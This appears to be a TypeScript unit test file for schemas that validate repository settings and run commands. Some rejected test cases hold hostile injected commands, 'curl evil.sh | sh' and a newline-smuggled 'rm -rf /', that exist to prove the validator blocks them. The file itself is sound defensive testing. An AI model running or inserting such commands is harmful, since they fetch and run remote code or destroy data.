import { describe, expect, it } from 'vitest';

import {
  CommandSchema,
  RepositorySettingsSchema,
  UpdateRepositorySettingsRequestSchema,
} from './repository.schemas.js';

describe('RepositorySettingsSchema', () => {
  it('turns an empty stored object into complete, safe defaults', () => {
    expect(RepositorySettingsSchema.parse({})).toEqual({
      testCommand: ['npm', 'test'],
      installCommand: ['npm', 'ci'],
      limits: { maxFilesChanged: 10, maxDiffLines: 400, testTimeoutSeconds: 300 },
      deniedPaths: [],
    });
  });
});

describe('CommandSchema', () => {
  it('accepts an argument vector starting with an allowed program', () => {
    expect(CommandSchema.safeParse(['pnpm', 'test', '--', '--coverage']).success).toBe(true);
  });

  it.each([
    ['a shell string', 'npm test; curl evil.sh | sh'],
    ['an empty list', []],
    ['a disallowed program', ['bash', '-c', 'npm test']],
    ['a path to a program', ['/usr/bin/npm', 'test']],
    ['a newline in an argument', ['npm', 'test\nrm -rf /']],
  ])('rejects %s', (_case, value) => {
    expect(CommandSchema.safeParse(value).success).toBe(false);
  });

  it('keeps shell metacharacters inert inside a single argument', () => {
    // Valid, but harmless: executed without a shell, ";" is just a character of one argument.
    expect(CommandSchema.safeParse(['npm', 'test', '--', 'name;rm']).success).toBe(true);
  });
});

describe('UpdateRepositorySettingsRequestSchema', () => {
  it('allows partial limit updates', () => {
    expect(UpdateRepositorySettingsRequestSchema.parse({ limits: { maxDiffLines: 800 } })).toEqual({
      limits: { maxDiffLines: 800 },
    });
  });

  it('rejects unknown and out-of-range fields', () => {
    expect(UpdateRepositorySettingsRequestSchema.safeParse({ shell: 'bash' }).success).toBe(false);
    expect(
      UpdateRepositorySettingsRequestSchema.safeParse({ limits: { maxFilesChanged: 999 } }).success,
    ).toBe(false);
  });
});
